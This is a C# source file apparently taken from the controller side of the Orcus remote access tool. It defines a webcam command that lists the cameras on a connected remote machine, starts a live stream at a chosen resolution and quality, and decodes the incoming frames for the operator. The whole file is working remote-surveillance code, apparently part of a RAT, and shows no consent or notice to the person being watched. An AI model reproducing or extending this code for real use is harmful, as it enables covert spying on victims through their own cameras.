using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Imaging;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Webcam;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Administration.Commands.Webcam
{
    [ProvideLibrary(PortableLibrary.AForge_Video)]
    [ProvideLibrary(PortableLibrary.AForge_Video_DirectShow)]
    [DescribeCommandByEnum(typeof(WebcamCommunication))]
    public class WebcamCommand : Command
    {
        private readonly object _unsafeStreamLock = new object();
        private string _currentDevice;
        private int _currentResolution;
        private bool _fireStarted;
        private int _framesReceived;
        private UnsafeStreamCodec _unsafeStreamCodec;
        private WebcamSettings _webcamSettings;
        private WriteableBitmap _writeableBitmap;
        private DateTime _frameTimestamp;

        public List<WebcamInfo> Webcams { get; private set; }
        public int Quality { get; set; } = 75;
        public WebcamInfo Webcam { get; set; }
        public WebcamResolution WebcamResolution { get; set; }

        public bool IsStreaming { get; private set; }
        public int FramesPerSecond { get; private set; }

        public override void Dispose()
        {
            base.Dispose();

            //important, else dead lock because this is UI thread and lock invokdes into UI thread -> block
            Task.Run(() =>
            {
                lock (_unsafeStreamLock)
                {
                    _unsafeStreamCodec?.Dispose();
                    _unsafeStreamCodec = null;
                }
            });
        }

        public event EventHandler<WriteableBitmap> RefreshWriteableBitmap;
        public event EventHandler Started;
        public event EventHandler StartFailed;
        public event EventHandler<List<WebcamInfo>> WebcamsReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((WebcamCommunication) parameter[0])
            {
                case WebcamCommunication.ResponseFrame:
                    if (_fireStarted)
                    {
                        _fireStarted = false;
                        Started?.Invoke(this, EventArgs.Empty);
                        IsStreaming = true;
                    }

                    ThreadPool.QueueUserWorkItem(state => ProcessImage(parameter, 1));
                    break;
                case WebcamCommunication.ResponseWebcams:
                    var serializer = new Serializer(typeof(List<WebcamInfo>));
                    var webcams = serializer.Deserialize<List<WebcamInfo>>(parameter, 1);
                    Webcams = webcams;
                    WebcamsReceived?.Invoke(this, webcams);

                    LogService.Receive(string.Format((string) Application.Current.Resources["WebcamsReceived"],
                        Webcams.Count));
                    break;
                case WebcamCommunication.ResponseResolutionNotFoundUsingDefault:
                    LogService.Warn((string) Application.Current.Resources["WebcamResolutionNotFound"]);
                    break;
                case WebcamCommunication.ResponseNoFrameReceived:
                    _fireStarted = false;
                    StartFailed?.Invoke(this, EventArgs.Empty);
                    LogService.Error((string) Application.Current.Resources["WebcamNoFrameReceived"]);
                    break;
                case WebcamCommunication.ResponseStarted:
                    LogService.Receive((string) Application.Current.Resources["WebcamStarted"]);
                    GetWebcamImage();
                    break;
                case WebcamCommunication.ResponseNotSupported:
                    LogService.Error((string) Application.Current.Resources["PlatformNotSupported"]);
                    break;
                case WebcamCommunication.ResponseStopped:
                    LogService.Receive((string) Application.Current.Resources["WebcamStopped"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetWebcams()
        {
            LogService.Send((string) Application.Current.Resources["GetWebcams"]);
            ConnectionInfo.SendCommand(this, new[] {(byte) WebcamCommunication.GetWebcams});
        }

        private void GetWebcamImage()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) WebcamCommunication.GetImage, (byte) Quality});
        }

        public async void Stop()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) WebcamCommunication.Stop});
            LogService.Send((string) Application.Current.Resources["StopWebcam"]);

            //important, else dead lock because this is UI thread and lock invokdes into UI thread -> block
            await Task.Run(() =>
            {
                lock (_unsafeStreamLock)
                {
                    _unsafeStreamCodec?.Dispose();
                    _unsafeStreamCodec = null;
                }
            });

            _framesReceived = 0;
        }

        public void Start()
        {
            _fireStarted = true;

            _webcamSettings = new WebcamSettings
            {
                MonikerString = Webcam.MonikerString,
                Resolution = Webcam.AvailableResolutions.IndexOf(WebcamResolution),
                Quality = Quality
            };

            var serializer = new Serializer(typeof(WebcamSettings));
            var webcamSettingsData = serializer.Serialize(_webcamSettings);
            var data = new byte[webcamSettingsData.Length + 1];
            data[0] = (byte) WebcamCommunication.Start;
            Buffer.BlockCopy(webcamSettingsData, 0, data, 1, webcamSettingsData.Length);

            ConnectionInfo.SendCommand(this, data);
            LogService.Send((string) Application.Current.Resources["StartWebcam"]);
        }

        private unsafe void ProcessImage(byte[] data, int index)
        {
            if (!IsStreaming)
                return;

            lock (_unsafeStreamLock)
            {
                if (!IsStreaming)
                    return;

                if (_unsafeStreamCodec != null && (_currentDevice != _webcamSettings.MonikerString ||
                                                   _currentResolution != _webcamSettings.Resolution))
                {
                    _unsafeStreamCodec.Dispose();
                    _unsafeStreamCodec = null;
                }

                if (_unsafeStreamCodec == null)
                {
                    _currentResolution = _webcamSettings.Resolution;
                    _currentDevice = _webcamSettings.MonikerString;
                    _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None);
                }

                WriteableBitmap writeableBitmap;
                fixed (byte* dataPtr = data)
                    writeableBitmap = _unsafeStreamCodec.DecodeData(dataPtr + index, (uint) (data.Length - index),
                        Application.Current.Dispatcher);

                _framesReceived++;
                if (_writeableBitmap != writeableBitmap)
                {
                    _writeableBitmap = writeableBitmap;
                    RefreshWriteableBitmap?.Invoke(this, writeableBitmap);
                }
            }

            if (IsStreaming)
                GetWebcamImage();

            if (FramesPerSecond == 0 && _framesReceived == 0)
                _frameTimestamp = DateTime.UtcNow;
            else if (DateTime.UtcNow - _frameTimestamp > TimeSpan.FromSeconds(1))
            {
                FramesPerSecond = _framesReceived;
                _framesReceived = 0;
                _frameTimestamp = DateTime.UtcNow;
            }
        }

        protected override uint GetId()
        {
            return 18;
        }
    }
}